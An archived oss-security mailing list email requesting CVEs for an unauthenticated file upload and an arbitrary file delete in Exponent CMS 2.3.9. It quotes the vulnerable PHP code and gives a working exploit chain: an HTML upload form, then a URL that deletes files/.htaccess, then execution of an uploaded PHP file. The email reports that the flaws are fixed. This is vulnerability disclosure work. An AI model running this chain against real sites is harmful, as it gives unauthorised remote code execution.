X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7006" "Friday" "30" "September" "2016" "16:52:15" "+0800" "fyth" "fyth.cnss@gmail.com" "<CAFkM3a+W0AVRx27OW4_1ZVkghYHGmb1MrukXnO+SjUOZ=Vu=DQ@mail.gmail.com>" "222" "[oss-security] CVE Request: File Upload & File Delete lead to Unauthorized RCE in Exponent CMS 2.3.9" "^Date:" nil nil "9" "2016093008:52:15" "[oss-security] CVE Request: File Upload & File Delete lead to Unauthorized RCE in Exponent CMS 2.3.9" (number mark "U       fyth.cnss@gm Sep 30  222/7006  " thread-indent "\"[oss-security] CVE Request: File Upload & File Delete lead to Unauthorized RCE in Exponent CMS 2.3.9\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9858 invoked by uid 550); 30 Sep 2016 13:29:51 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 16358 invoked from network); 30 Sep 2016 08:52:27 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to;
        bh=YkGQPT/hvE/8fa0Dz6XNe4UOpHblrpvwOOL31J57QDg=;
        b=Yn5SF2JGQD3V5KDgs1Kg6wiGIOepZnnAuFQVpw9BywToN2UPGUM0irdA1qC1e++QVC
         SniYlbyPaXiKqEVoN+Q8y5e7BUX4mzkMLY7LaOogR3lQWgkL0WrguxbBI+vsgE7NWeFl
         ddrxf8UV+8thV41OUOPbJfJRgYHYtZMTpcMt8TSAOfAH9Y/rXS7iPM9j/5uA9Sa6+iTE
         rQ8f+7k3qRUT7rb+kp00ufwA2ATKTlojP2NyMZ/Lu9+664cFa0W9dI9JGj1LLS0wX2y8
         73as75YxSJOjTsIaDQxh2VW1pmgNyK3Wf0MCaN2SJajkb77ge9fVJhWcc1zFiMUxRqTE
         Qfxg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=YkGQPT/hvE/8fa0Dz6XNe4UOpHblrpvwOOL31J57QDg=;
        b=SMvxFHFOgOMW/gG9tf19OqbRbxVWtNKQgWDmGuJEc8TURGVLvSO9Xt6JS9Eg+yqGIU
         cJ7jUAu7r1ACyBwVLcZmVCeDrCSlczRnz7w3nJq5JgKZ3GI8HT2LgZG3cOELOHugV4XL
         gjcUQCg9Y3ZZ6U5B3ThdeQm908ND/Smg65mpw5LF/UdFmJPeAEmwayNdSmIATHYHuS9T
         HRtRt0hbofD3AssC3+CO5gXmkqpLgaMZTIC+VuCXVaUXbFBBqv6lcdl8turtZVPRiXUn
         zpeaH3sGXpL8UWebEa8fHcTq/Zci6R5hWSNfCpH5FHinRXnsBk0UBYhacTYfEeNK06Vs
         EWNA==
X-Gm-Message-State: AA6/9RnYkojjPFiuNEc/7a6lqI4nefAuLihfbbojr9bHTaDn74RDBOidITlEaEYzS6eF0XZq2i/SufpQeoUWKg==
X-Received: by 10.28.136.197 with SMTP id k188mr2875690wmd.54.1475225535874;
 Fri, 30 Sep 2016 01:52:15 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CAFkM3a+W0AVRx27OW4_1ZVkghYHGmb1MrukXnO+SjUOZ=Vu=DQ@mail.gmail.com>
Content-Type: multipart/alternative; boundary=001a114432780789c2053db5b6fc
Date: Fri, 30 Sep 2016 16:52:15 +0800
From: fyth <fyth.cnss@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE Request: File Upload & File Delete lead to Unauthorized RCE in
 Exponent CMS 2.3.9
To: oss-security@lists.openwall.com

--001a114432780789c2053db5b6fc
Content-Type: text/plain; charset=UTF-8

CVE Request: File Upload & File Delete lead to Unauthorized RCE in Exponent
CMS 2.3.9

Hi, I reported two vulnerabilities to the ExponentCMS team on 20th Sept
2016:


1.Arbitrary File Upload vulnerability

/framework/modules/file/controllers/fileController.php

line 529-565

```

    public function upload() {

        // upload the file, but don't save the record yet...
        if ($this->params['resize'] != 'false') {
            $maxwidth = $this->params['max_width'];
        } else {
            $maxwidth = null;
        }
        $file =
expFile::fileUpload('Filedata',false,false,null,null,$maxwidth);
        // since most likely this function will only get hit via flash in
YUI Uploader
        // and since Flash can't pass cookies, we lose the knowledge of our
$user
        // so we're passing the user's ID in as $_POST data. We then
instantiate a new $user,
        // and then assign $user->id to $file->poster so we have an audit
trail for the upload

        if (is_object($file)) {
            $resized = !empty($file->resized) ? true : false;
            $user = new user($this->params['usrid']);
            $file->poster = $user->id;
            $file->posted = $file->last_accessed = time();
            $file->save();
            if (!empty($this->params['cat'])) {
                $expcat = new expCat($this->params['cat']);
                $params['expCat'][0] = $expcat->id;
                $file->update($params);
            }

            // a echo so YUI Uploader is notified of the function's
completion
            if ($resized) {
                echo gt('File resized and then saved');
            } else {
                echo gt('File saved');
            }
        } else {
            echo gt('File was NOT uploaded!');
//            flash('error',gt('File was not uploaded!'));
        }
    }


```

An unauthorized user can upload any file into the /files folder under
Exponent directory, including malicious files such as PHP files.

Exponent team put a .htaccess file under /files folder to prevent these
malicious files from being executed with the following content:
```
<FilesMatch "\.(php|phps|pl|py|jsp|asp|htm|html|shtml|sh|cgi|txt)$">
    ForceType text/plain
</FilesMatch>

```
But, if we can somehow get rid of this .htaccess file, we can get a RCE
vulnerability.

2.Arbitrary File Delete vulnerability:

/framework/modules/forms/controllers/formsController.php


line 1939-2010:
```
    public function import_csv_data_add() {
        global $user;

        $line_end = ini_get('auto_detect_line_endings');
        ini_set('auto_detect_line_endings',TRUE);
        $file = fopen(BASE . $this->params["filename"], "r");
        $recordsdone = 0;
        $linenum = 1;
        $f = new forms($this->params['forms_id']);
        $f->updateTable();

        $fields = array();
        $multi_item_control_items = array();
        $multi_item_control_ids = array();
        foreach ($f->forms_control as $control) {
            $fields[$control->name] = expUnserialize($control->data);
            $ctltype = get_class($fields[$control->name]);
            if
(in_array($ctltype,array('radiogroupcontrol','dropdowncontrol'))) {
                if
(!array_key_exists($control->id,$multi_item_control_items)) {
                    $multi_item_control_items[$control->name] = null;
                    $multi_item_control_ids[$control->name] = $control->id;
                }
            }
        }

        while (($filedata = fgetcsv($file, 2000,
$this->params["delimiter"])) != false) {
            if ($linenum >= $this->params["rowstart"] &&
in_array($linenum,$this->params['importrecord'])) {
                $i = 0;
                $db_data = new stdClass();
                $db_data->ip = '';
                $db_data->user_id = $user->id;
                $db_data->timestamp = time();
                $db_data->referrer = '';
                $db_data->location_data = '';
                foreach ($filedata as $field) {
                    if (!empty($this->params["column"][$i]) &&
$this->params["column"][$i] != "none") {
                        $colname = $this->params["column"][$i];
                        $control_type = get_class($fields[$colname]);
                        $params[$colname] = $field;
                        $def = call_user_func(array($control_type,
"getFieldDefinition"));
                        if (!empty($def)) {
                            $db_data->$colname =
call_user_func(array($control_type, 'convertData'), $colname, $params);
                        }
                        if (!empty($db_data->$colname) &&
array_key_exists($colname,$multi_item_control_items) &&
!in_array($db_data->$colname,$multi_item_control_items[$colname])) {
                            $multi_item_control_items[$colname][] =
$db_data->$colname;
                        }
                    }
                    $i++;
                }
                $f->insertRecord($db_data);
                $recordsdone++;
            }
            $linenum++;
        }

        fclose($file);
        ini_set('auto_detect_line_endings',$line_end);

        // update multi-item forms controls
        if (!empty($multi_item_control_ids)) {
            foreach ($multi_item_control_ids as $key=>$control_id) {
                $fc = new forms_control($control_id);
                $ctl = expUnserialize($fc->data);
                $ctl->items = $multi_item_control_items[$key];
                $fc->data = serialize($ctl);
                $fc->update();
            }
        }
        unlink(BASE . $this->params["filename"]);
        flash('notice', $recordsdone.' '.gt('Records Imported'));
        expHistory::back();
    }
```
$this->params["filename"] is basically $_GET['filename'], without any
sanitization.




Exploit:

The first step is to upload a php file using the following html, lets call
it test.php


<html>
<body>

<form action="
http://yourexponentcms/?controller=file&action=upload&resize=false"
method="post"
enctype="multipart/form-data">
Filename:
<input type="file" name="Filedata" id="file">

<input type="submit" name="submit" value="Submit">
</form>

</body>
</html>


And the second step is to delete the .htaccess file.
http://yourexponentcms/index.php?controller=forms&action=import_csv_data_add&filename=files/.htaccess


And now your http://yourexponentcms/files/test.php will be executed without
any obstacles.




And Now, these vulnerabilities have been fixed.
https://exponentcms.lighthouseapp.com/projects/61783/changesets/fdafb5ec97838e4edbd685f587f28d3174ebb3db
https://github.com/exponentcms/exponent-cms/commit/fdafb5ec97838e4edbd685f587f28d3174ebb3db

This issue was reported by Wang Chang of silence.com.cn Inc. and I would
like
to request CVE ids for these issues (if not done so).

Thank you.
---------------------------------http://www.silence.com.cn
wangchang#silence.com.cn
PKAV Team

--001a114432780789c2053db5b6fc--
